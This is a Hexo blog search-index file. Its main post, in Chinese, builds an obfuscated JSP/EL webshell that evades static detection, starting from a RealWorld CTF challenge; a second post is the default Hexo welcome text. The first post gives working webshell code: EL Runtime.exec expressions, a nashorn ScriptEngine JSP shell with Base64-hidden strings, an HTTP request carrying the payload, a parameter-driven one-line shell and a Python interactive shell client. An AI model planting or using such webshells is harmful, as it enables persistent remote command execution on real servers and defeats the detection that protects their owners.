<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>新型EL webshell初探</title>
    <link href="/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/"/>
    <url>/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="从DesperateCat到EL-webshell初探"><a href="#从DesperateCat到EL-webshell初探" class="headerlink" title="从DesperateCat到EL webshell初探"></a>从DesperateCat到EL webshell初探</h1><h2 id="0x00-RWCTF引发的思考"><a href="#0x00-RWCTF引发的思考" class="headerlink" title="0x00 RWCTF引发的思考"></a>0x00 RWCTF引发的思考</h2><pre><code class="hljs">前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：</code></pre><ul><li><p><strong>禁止传入圆括号、尖括号、引号等</strong>。</p><p>  如果我们单独处理bypass，那么其实很好解决：</p></li></ul><ol><li>尖括号 &lt;% %&gt;：使用EL表达式</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime.exec(request.getParameter(&quot;cmd&quot;));%&gt;</span><br><span class="hljs-comment">//替换成为</span><br>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>这样就避免出现了尖括号。</p><p>2.圆括号 () : java 代码编译解析器会识别 Unicode 形式的编码，所可以直接unicode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime().exec(&quot;calc&quot;);%&gt;</span><br>&lt;%\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%&gt;<br></code></pre></td></tr></table></figure><p>但是要完全bypass，显然两者都是不行的，那么最终的方式是采用EL表达式中的 <strong>‘.’</strong> 与 <strong>‘&#x3D;’</strong>  。</p><ul><li><strong>EL中 . 点号属性取值相当于执行对象的 getter 方法，</strong>&#x3D; <strong>赋值则等同于执行 setter 方法。</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;<br><span class="hljs-comment">//等同于</span><br>pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter(<span class="hljs-string">&quot;a&quot;</span>));<br></code></pre></td></tr></table></figure><p>通过这种方式我们可以获得ClassLoader修改一些tomcat的属性，最终达到利用session写shell的目的，当然到目前这道题目只是完成了一小部分，后面还涉及到如何使Tomcat reload 并实现持久化贮存session的问题等等，各位感兴趣的可以看一下长亭官方的wp。</p><pre><code class="hljs">**这道题目使用EL表达式进行bypass的方式引起了我的注意，通过精心构造EL表达式我们是否能实现更加精简且具有一定bypass能力的jsp webshell？**</code></pre><h2 id="0x01-简单尝试与回显问题"><a href="#0x01-简单尝试与回显问题" class="headerlink" title="0x01 简单尝试与回显问题"></a>0x01 简单尝试与回显问题</h2><p>我们使用开头提到的EL表达式来试一试：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png" alt="image-20220907140149065"></p><p>执行是没有问题的，但是我们要制作webshell，没有回显是肯定不行的，这里我联想到了前段时间学习webshell免杀的一种构造方式：<strong>调用ScriptEngine来执行js</strong>。</p><blockquote><p>我们使用ScriptEngine构造出的webshell是这样的：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br> <span class="hljs-type">String</span> s = <span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=&#x27;&quot;</span>;<br> <span class="hljs-type">String</span> cmd = request.<span class="hljs-built_in">getParameter</span>(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <span class="hljs-type">String</span> rt = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(Base64.<span class="hljs-built_in">getDecoder</span>().<span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;</span>));<br> <span class="hljs-built_in">Process</span> process = (<span class="hljs-built_in">Process</span>) <span class="hljs-keyword">new</span> <span class="hljs-built_in">ScriptEngineManager</span>().<span class="hljs-built_in">getEngineByName</span>(<span class="hljs-string">&quot;nashorn&quot;</span>).<span class="hljs-built_in">eval</span>(s + cmd + rt);<br> InputStreamReader reader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">InputStreamReader</span>(process.<span class="hljs-built_in">getInputStream</span>());<br> BufferedReader buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BufferedReader</span>(reader);<br> s = null;<br> <span class="hljs-keyword">while</span> ((s = buffer.<span class="hljs-built_in">readLine</span>()) != null) &#123;<br>     response.<span class="hljs-built_in">getWriter</span>().<span class="hljs-built_in">println</span>(s);<br> &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>很好理解，获取nashorn JavaScript引擎实现命令执行。</p></blockquote><p>想到这种方法是因为我们可以尽可能的减少webshell中的代码量，通过传递指定的js代码来执行脚本，从而更好地绕过文件内容检测。</p><h2 id="0x02-EL-ScriptEngine"><a href="#0x02-EL-ScriptEngine" class="headerlink" title="0x02 EL + ScriptEngine"></a>0x02 EL + ScriptEngine</h2><p>首先我们在webshell中通过反射配合动态传递参数的方式获取Engine并执行eval。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//test.jsp</span><br>$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>首先反射获取ScriptEngineManager对象：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">test.jsp?<span class="hljs-attribute">spr1</span>=javax.script.ScriptEngineManager<br></code></pre></td></tr></table></figure><p>然后调用js引擎执行脚本，我们将上方给出的ScriptEngine版本的webshell进行改造，将其改造成js版本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">try&#123;<br>    load(<span class="hljs-string">&quot;nashorn:mozilla_compat.js&quot;</span>);<br>&#125;<br>catch (e)&#123;<br>&#125;<br>importPackage(Packages.java.util);<br>importPackage(Packages.java.lang);<br>importPackage(Packages.java.io);<br>s=[2];<br>s[0]=<span class="hljs-string">&#x27;cmd&#x27;</span>;<br>s[1]=<span class="hljs-string">&#x27;/c whoami /all&#x27;</span>;<br><span class="hljs-attribute">a</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-attribute">b</span>=java.lang.Runtime.getRuntime().exec(s).getInputStream();<br>output+=new BufferedReader(new+InputStreamReader(b));<br><span class="hljs-keyword">while</span> ((<span class="hljs-attribute">line</span>=output.readLine()) != <span class="hljs-literal">null</span>) <br>&#123;<br>    <span class="hljs-attribute">o</span>=o+line+&quot;\n&quot;<br>&#125;;o<br></code></pre></td></tr></table></figure><p>然后我们将其传入执行js，最终的包长这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/test.jsp?spr1=javax.script.ScriptEngineManager</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.20.10.2:8080<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=4A34A77B78CD48404804BFD7420A0195<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>414<br><br><span class="language-xquery">spr2=<span class="hljs-keyword">try</span>&#123;load(<span class="hljs-string">&quot;nashorn%3amozilla_compat.js&quot;</span>)<span class="hljs-meta">%3b</span>&#125;<span class="hljs-keyword">catch</span>(e)&#123;&#125;importPackage(Packages.java.util)<span class="hljs-meta">%3bimportPackage</span>(Packages.java<span class="hljs-built_in">.lang</span>)<span class="hljs-meta">%3bimportPackage</span>(Packages.java.io)<span class="hljs-meta">%3bs</span><span class="hljs-meta">%3d</span>[<span class="hljs-number">2</span>]<span class="hljs-meta">%3bs</span>[<span class="hljs-number">0</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;cmd&#x27;</span><span class="hljs-meta">%3bs</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;/c+whoami&#x27;</span><span class="hljs-meta">%3ba</span><span class="hljs-meta">%3d</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-meta">%3bb</span><span class="hljs-meta">%3djava</span><span class="hljs-built_in">.lang</span>.Runtime.getRuntime().exec(s).getInputStream()<span class="hljs-meta">%3boutput</span>+<span class="hljs-meta">%3d</span>+new+BufferedReader(new+InputStreamReader(b))<span class="hljs-meta">%3bwhile</span>+((line<span class="hljs-meta">%3doutput</span>.readLine())+!<span class="hljs-meta">%3d</span>+null)+&#123;a<span class="hljs-meta">%3da</span><span class="hljs-meta">%2bline</span><span class="hljs-meta">%2b</span><span class="hljs-string">&quot;\n&quot;</span>&#125;<span class="hljs-meta">%3ba</span></span><br></code></pre></td></tr></table></figure><p>然后执行，没有问题。</p><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png" alt="image-20220907140219279"></p><h2 id="0x03-进一步混淆"><a href="#0x03-进一步混淆" class="headerlink" title="0x03 进一步混淆"></a>0x03 进一步混淆</h2><p>虽然已经可以通过传递指定js脚本执行命令，但仔细来看</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>这段代码还是包含了一些较为敏感的关键字，譬如forName、getEngineByName、eval等，作为一个webshell来讲，显然是不够“干净整洁”的；为进一步混淆，我们可以采用动态传递的方式来替换关键字。</p><p>在EL表达式中，我们知道获取属性可以使用a.b或者a[‘b’]，使用后者就意味着我们可以把所有属性和方法转化成字符串：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getClass&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;forName&quot;</span>]</span>(&quot;javax.script.ScriptEngineManager&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;newInstance&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getEngineByName&quot;</span>]</span>(&quot;JavaScript&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;eval&quot;</span>]</span>(&quot;...&quot;)&#125;<br></code></pre></td></tr></table></figure><p>那么这样做有什么好处呢？</p><p>首先我们可以随意拼接：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;ge&quot;</span>+<span class="hljs-string">&quot;tCl&quot;</span>+<span class="hljs-string">&quot;ass&quot;</span>]()[<span class="hljs-string">&quot;for&quot;</span>+<span class="hljs-string">&quot;Name&quot;</span>](<span class="hljs-string">&quot;javax.scr&quot;</span>+<span class="hljs-string">&quot;ipt.ScriptEng&quot;</span>+<span class="hljs-string">&quot;ineManager&quot;</span>)[<span class="hljs-string">&quot;newIn&quot;</span>+<span class="hljs-string">&quot;stance&quot;</span>]()[<span class="hljs-string">&quot;getEng&quot;</span>+<span class="hljs-string">&quot;ineByName&quot;</span>](<span class="hljs-string">&quot;java&quot;</span>+<span class="hljs-string">&quot;script&quot;</span>)[<span class="hljs-string">&quot;e&quot;</span>+<span class="hljs-string">&quot;val&quot;</span>](<span class="hljs-string">&quot;...&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>更重要的是如此我们可以将字符串通过param.xxx来传递，这样就会实现如下的改造：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure><p>测试后可以执行：</p><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220902101416244.png" alt="image-20220902101416244"></p><p>这种高度精简就实现了将绝大部分代码通过传递来执行，应当具有较好的静态免杀能力。</p><h2 id="0x04-小总结"><a href="#0x04-小总结" class="headerlink" title="0x04 小总结"></a>0x04 小总结</h2><p>这个小思路也是启发于星球里的师傅，同时也想到了之前的RWCTF中的题目，而从本质上讲也许可以把它看作是EL表达式注入的变种。</p><p>我们从最初的</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>到</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(param.spr1)<span class="hljs-selector-class">.newInstance</span>()<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&quot;javascript&quot;</span>)<span class="hljs-selector-class">.eval</span>(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>再到</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure><p>可以发现这种webshell的优势也很明显：</p><ul><li><strong>足够小，一句话就可以实现命令执行+回显的功能</strong>。</li><li><strong>避免出现&lt;%、Class、eval等敏感字符，具有bypass能力</strong>。</li></ul><p>当然这只是个demo，它还可以更美观比如将cmd通过占位符提取出来放到headers里；再比如我们的body有点臃肿，我们直接用python封装实现一个交互式shell也不错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#shell_mananger:</span><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>(<span class="hljs-params">cmd:<span class="hljs-built_in">str</span>,is_linux:<span class="hljs-built_in">bool</span></span>):<br>    PROXY=&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8081&quot;</span>&#125;<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:8080/test.jsp&quot;</span><br><br>    headers=&#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36&quot;</span>,<br><br>        &#125;<br><br>    params=&#123;<br>        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;getClass&quot;</span>,<br>        <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-string">&quot;forName&quot;</span>,<br>        <span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>,<br>        <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;newInstance&quot;</span>,<br>        <span class="hljs-string">&quot;e&quot;</span>:<span class="hljs-string">&quot;getEngineByName&quot;</span>,<br>        <span class="hljs-string">&quot;f&quot;</span>:<span class="hljs-string">&quot;javascript&quot;</span>,<br>        <span class="hljs-string">&quot;g&quot;</span>:<span class="hljs-string">&quot;eval&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> is_linux:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;/bin/bash&#x27;;s[1]=&#x27;-c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br><br>    data=&#123;<br>        <span class="hljs-string">&quot;h&quot;</span>: payload<br>        <span class="hljs-comment">#注意这里换行符要对\多转义一次防止py解析</span><br>    &#125;<br>    <span class="hljs-comment"># print(data)</span><br>    res=requests.post(url=url, headers=headers,params=urllib.parse.urlencode(params),<br>                        data=urllib.parse.urlencode(data),proxies=<span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> res.text<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    check=<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-keyword">in</span> check:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/09/12/hello-world/"/>
    <url>/2022/09/12/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem 1"></a>problem 1</h3><p>使用了图床插件，生成时会自动将图片复制到<blogname>文件夹下，但仍需要修改图片地址</p><p>将图片全部移动至_post文件夹下，注意md中图片的地址需要加上日期，如下形式：</p><p>.&#x2F;2022&#x2F;09&#x2F;12&#x2F;新型EL-webshell初探&#x2F;image-20220907140219279.png</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
